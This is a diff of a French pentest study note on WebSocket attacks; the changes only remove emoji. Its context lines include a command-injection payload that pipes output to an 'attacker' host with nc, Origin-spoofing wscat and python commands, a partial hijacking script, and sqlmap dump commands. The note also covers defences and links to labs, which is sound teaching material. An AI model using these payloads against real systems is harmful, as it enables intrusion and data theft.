@@ -12,7 +12,7 @@ statut: publie
 
 
 
-# 🔌 Web Sockets — attaques
+# Web Sockets — attaques
 
 > [!info] **En 1 phrase**
 > WebSockets = canal **full-duplex persistant** (bi-directionnel, basse latence) entre un navigateur et un serveur.
@@ -23,7 +23,7 @@ statut: publie
 
 ---
 
-## 🎯 Concept
+## Concept
 
 ```mermaid
 flowchart LR
@@ -34,14 +34,14 @@ flowchart LR
     D --> F[Données temps réel]
 ```
 
-> [!info] 💡 **Pourquoi c'est différent de HTTP**
+> [!info] **Pourquoi c'est différent de HTTP**
 > Une fois le `101` obtenu, **plus de requête/réponse** : le client et le serveur poussent des frames
 > n'importe quand. Les protections HTTP classiques (CSRF tokens, CORS, auth par requête) ne s'appliquent pas
 > au contenu des frames → chaque message doit être traité comme une **requête indépendante**.
 
 ---
 
-## 📜 Le protocole (rappel 101)
+## Le protocole (rappel 101)
 
 ### Handshake : HTTP d'abord, puis upgrade
 
@@ -62,7 +62,7 @@ Connection: Upgrade
 Sec-WebSocket-Accept: s3pPLMBiTxaQ9kYGzzhZRbK+xOo=
 ```
 
-> [!warning] ⚠️ **Le point d'attaque n°1** : `Sec-WebSocket-Key` est juste un nonce pour l'accept (SHA1 + base64),
+> [!warning] **Le point d'attaque n°1** : `Sec-WebSocket-Key` est juste un nonce pour l'accept (SHA1 + base64),
 > **pas une authentification**. L'**Origin** est le SEUL contrôle anti-CSWSH de la spec — s'il n'est pas vérifié → CSWSH.
 
 ### Frames & schémas
@@ -87,7 +87,7 @@ grep -oE "wss?://[^\"']+|/socket\.io|/ws[^\"']*" app.js bundle.js
 
 ---
 
-## 🎭 Attaques côté client
+## Attaques côté client
 
 ### Cross-Site WebSocket Hijacking (CSWSH)
 
@@ -120,7 +120,7 @@ vers le domaine cible lors d'une connexion cross-origin → l'attaquant **détou
 </script>
 ```
 
-> [!warning] ⚠️ **fetch / XMLHttpRequest ne peuvent PAS ouvrir un WebSocket** (API du navigateur bloquée pour eux).
+> [!warning] **fetch / XMLHttpRequest ne peuvent PAS ouvrir un WebSocket** (API du navigateur bloquée pour eux).
 > L'exploit passe obligatoirement par `new WebSocket()`. En revanche un `fetch` peut servir à **envoyer un GET cross-origin**
 > pour détecter si le serveur répond au handshake (code 101) → confirmer l'absence de vérification d'Origin.
 
@@ -160,7 +160,7 @@ Le serveur (ou un autre client) peut envoyer du contenu **non échappé** qui se
 
 ---
 
-## 🛠️ Attaques côté serveur
+## Attaques côté serveur
 
 ### Injection dans les messages (SQLi / commande)
 
@@ -180,7 +180,7 @@ des commandes OS, des templates... sans validation.
 {"hostname":"$(id) | nc attacker 4444"}
 ```
 
-> [!tip] 💡 **Chaîner avec sqlmap** : utilise `ws-harness.py` (cf. Outils) qui expose le flux WebSocket en proxy HTTP
+> [!tip] **Chaîner avec sqlmap** : utilise `ws-harness.py` (cf. Outils) qui expose le flux WebSocket en proxy HTTP
 > → on attaque ensuite le socket avec `sqlmap -u http://127.0.0.1:8000/?fuzz=test --tamper=base64encode --dump`.
 
 ### Auth manquante / faillible
@@ -214,7 +214,7 @@ not-json
 
 ---
 
-## 🌐 Origine non vérifiée
+## Origine non vérifiée
 
 ### Tester l'en-tête Origin
 
@@ -237,7 +237,7 @@ wscat -c wss://target/ws --header "Origin: https://attacker.example.net"
 python -c "from websocket import create_connection; ws=create_connection('wss://target/ws', origin='https://attacker.example.net'); print('connecté', ws.recv())"
 ```
 
-> [!warning] ⚠️ **Piège classique** : les cookies SameSite ne sauvent pas grand-chose en WS —
+> [!warning] **Piège classique** : les cookies SameSite ne sauvent pas grand-chose en WS —
 > SameSite=Lax n'empêche PAS l'envoi des cookies sur une connexion WebSocket cross-site (pas de navigation top-level).
 > Il faut une **validation explicite d'Origin côté serveur**.
 
@@ -254,7 +254,7 @@ Origin: https://attacker.com?target.com
 
 ---
 
-## 🔀 Subprotocol confusion
+## Subprotocol confusion
 
 Le client peut demander des sous-protocoles via `Sec-WebSocket-Protocol` (2e argument du constructeur JS).
 Si le serveur accepte n'importe lequel → desambiguïsation de rôles, injection dans le handler.
@@ -282,12 +282,12 @@ Origin: https://target.com
 wscat -c ws://target/ws --protocol "admin,debug,superuser,root"
 ```
 
-> [!tip] 💡 Si le handshake de l'app exige un subprotocol, il faut le **rejouer exactement**
+> [!tip] Si le handshake de l'app exige un subprotocol, il faut le **rejouer exactement**
 > dans l'exploit CSWSH (`new WebSocket(url, 'leprotocole')`) sinon la connexion échoue avant l'attaque.
 
 ---
 
-## 🧰 Outils
+## Outils
 
 ### Burp Suite
 
@@ -343,7 +343,7 @@ sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 
 ---
 
-## 🔍 Détection & Défense
+## Détection & Défense
 
 | Réponse | Détail |
 |---|---|
@@ -359,17 +359,17 @@ sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 
 ---
 
-## ⚠️ Tips & Pièges
+## Tips & Pièges
 
-> [!tip] 💡 **Différence clé avec HTTP**
+> [!tip] **Différence clé avec HTTP**
 > HTTP = stateless, chaque requête est indépendante, les protections (CORS, CSRF) sont par-requête.
 > WebSocket = connexion longue + cookies envoyés à l'handshake → si l'Origin n'est pas vérifiée, toute la session est récupérable.
 
-> [!tip] 💡 **CSWSH vs CSRF**
+> [!tip] **CSWSH vs CSRF**
 > CSRF = forcer une **action HTTP** (POST qui change l'état). CSWSH = détourner **tout le canal bidirectionnel**
 > et lire les réponses du serveur (exfiltration). CSWSH est plus grave : l'attaquant voit les données en temps réel.
 
-> [!warning] ⚠️ **Pièges**
+> [!warning] **Pièges**
 > - `SameSite=Lax` ne bloque pas les cookies sur le handshake WebSocket cross-site → toujours valider l'Origin.
 > - `Origin: null` (iframes sandboxées, `file://`) est souvent **accepté à tort** → le refuser.
 > - Le 2e paramètre de `new WebSocket(url, subprotocol)` doit matcher celui de l'app, sinon handshake KO.
@@ -379,13 +379,13 @@ sqlmap -u http://127.0.0.1:8000/?fuzz=test --tables --tamper=base64encode --dump
 
 ---
 
-## 🔗 Liens
+## Liens
 
-- [[XSS (Cross-Site Scripting)|🖼️ XSS]]
-- [[CORS|🌐 CORS]]
-- [[CSRF|🔄 CSRF]]
-- [[Injection SQL|💾 Injection SQL]]
-- [[Injection de commandes|🐚 Injection de commandes]]
-- → Note complète : [[03 - Exploitation Web|🌍 Exploitation Web]]
-- 📚 Source : [PayloadsAllTheThings — Web Sockets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md)
-- 🧪 Labs : [PortSwigger — WebSocket security](https://portswigger.net/web-security/websockets)
+- [[XSS (Cross-Site Scripting)| XSS]]
+- [[CORS| CORS]]
+- [[CSRF| CSRF]]
+- [[Injection SQL| Injection SQL]]
+- [[Injection de commandes| Injection de commandes]]
+- → Note complète : [[03 - Exploitation Web| Exploitation Web]]
+- Source : [PayloadsAllTheThings — Web Sockets](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Web%20Sockets/README.md)
+- Labs : [PortSwigger — WebSocket security](https://portswigger.net/web-security/websockets)
